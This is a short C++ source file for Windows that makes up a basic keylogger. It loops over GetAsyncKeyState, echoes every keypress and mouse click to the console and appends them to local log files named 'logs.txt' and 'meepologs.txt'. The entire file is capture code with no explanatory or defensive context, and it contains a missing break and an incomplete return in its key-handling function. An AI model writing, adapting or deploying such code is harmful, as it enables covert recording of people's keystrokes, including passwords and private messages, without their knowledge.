#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <algorithm>

using namespace std;

void WriteLog(LPCSTR logs) {
	ofstream outfile; 
	outfile.open("logs.txt", ofstream::app); 
	outfile << logs; 
	outfile.close(); 
}

bool KeyIsListed(int iGetKey) {
	switch (iGetKey)
	{
	case VK_RBUTTON:
		cout << " *rclick* " << endl; 
		WriteLog(" *rclick* ");
		break;
	case VK_LBUTTON:
		cout << " *lclick* " << endl;
		WriteLog(" *lclick* ");
		break;
	case VK_CONTROL:
		cout << " *Ctrl* " << endl; 
		WriteLog(" *Ctrl* ");
		break;
	case VK_SHIFT:
		cout << " *Shift* " << endl; 
		WriteLog(" *Shift* ");
		break;
	case VK_RETURN:
		cout << " *enter* "; 
		WriteLog(" *enter* ");
	case VK_SPACE:
		cout << "  "; 
		WriteLog("  ");
		break;
	default: return FALSE;
	}
}

int main()
{
	char key; 
	while (TRUE)
	{
		Sleep(10); 
		for (key = 8; key <= 190; key++) 
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE)
				{
					cout << key; 
					ofstream outfile; 
					outfile.open("meepologs.txt", ofstream::app);
					outfile << key;
					outfile.close();
				}
				else {
				}
			}
		}
	}
	return EXIT_SUCCESS;
}
